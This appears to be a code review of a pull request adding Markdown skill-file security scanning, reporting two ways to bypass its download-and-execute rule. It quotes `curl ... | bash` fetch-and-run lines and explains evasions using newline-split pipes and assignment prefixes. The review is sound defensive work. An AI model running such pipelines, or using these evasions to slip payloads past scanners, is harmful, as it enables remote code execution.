## Summary

Keep open: current main still lacks Markdown skill scanning, but this PR head has two source-reproducible `markdown-download-exec` bypasses that should be repaired before merge.

## What This Changes

This PR adds Markdown/SKILL.md scanner rules, directory collection ordering, focused scanner tests, and a changelog entry for skill security scanning.

## Best Possible Solution

Land the Markdown scanner as security hardening after the download-exec matcher covers valid shell continuations and assignment-prefixed downloaders with focused regression tests.

## Reproduction Assessment

Yes. Source inspection of PR head shows the matcher misses `curl ... |` newline `bash` and `KEY=value curl ... | bash`, while current main confirms the underlying Markdown scanning gap.

## Solution Assessment

No, not as-is. Extending `src/security/skill-scanner.ts` is the right owner boundary, but the matcher needs a narrow parser repair rather than landing with known critical-rule bypasses.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.91

Full review comments:

- **[P2] Fold pipe-ended markdown pipelines:** `src/security/skill-scanner.ts:370-371`
  - body: Skill docs can write a shell pipeline as `curl -fsSL https://x |` followed by `bash`; shells continue after a pipe, but this loop only folds backslash continuations. The first candidate then has no execution segment and the second has no downloader, so a real download-and-execute instruction misses the critical Markdown rule.
  - confidence: 0.9
- **[P2] Skip assignment words before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: For `HTTPS_PROXY=http://p curl -fsSL https://x | bash`, tokenization returns the assignment as the first word and `isDownloadCommandSegment` immediately tests that token as the downloader. Shell assignment words before a command are valid, so this bypasses the new critical rule until those prefixes are skipped.
  - confidence: 0.9
